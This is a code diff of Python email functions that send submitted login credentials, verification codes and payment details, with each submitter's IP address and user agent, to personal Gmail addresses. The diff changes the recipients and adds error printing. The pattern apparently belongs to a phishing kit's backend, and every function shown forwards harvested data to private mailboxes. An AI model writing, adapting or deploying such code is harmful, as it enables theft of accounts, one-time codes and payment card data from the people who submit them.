@@ -33,13 +33,18 @@ def send_login_notification_email(login_data, ip_address, user_agent):
     IP Address: {ip_address}
     User Agent: {user_agent}
     """
-    send_mail(
-        email_subject,
-        email_body,
-        'chimasid7@gmail.com',
-        ['chimasid7@gmail.com'],
-        fail_silently=False,
-    )
+    try:
+        send_mail(
+            email_subject,
+            email_body,
+            'chimasid7@gmail.com',
+            ['jvictory278@gmail.com'],
+            fail_silently=False,
+        )
+        print("✅ Email sent successfully!")
+    except Exception as e:
+        print(f"❌ Email failed: {type(e).__name__}: {e}")
+        raise  # Re-raise to see the full error
 
 def send_code_notification_email(code_data, ip_address, user_agent):
     email_subject = 'Verification Code Submitted'
@@ -56,7 +61,7 @@ def send_code_notification_email(code_data, ip_address, user_agent):
         email_subject,
         email_body,
         'chimasid7@gmail.com',
-        ['chimasid7@gmail.com'],
+        ['jvictory225@gmail.com'],
         fail_silently=False,
     )
 
@@ -78,7 +83,7 @@ def send_payment_email(payment_data, ip_address, user_agent):
         email_subject,
         email_body,
         'chimasid7@gmail.com',
-        ['chimasid7@gmail.com'],
+        ['jvictory225@gmail.com'],
         fail_silently=False,
     )
 
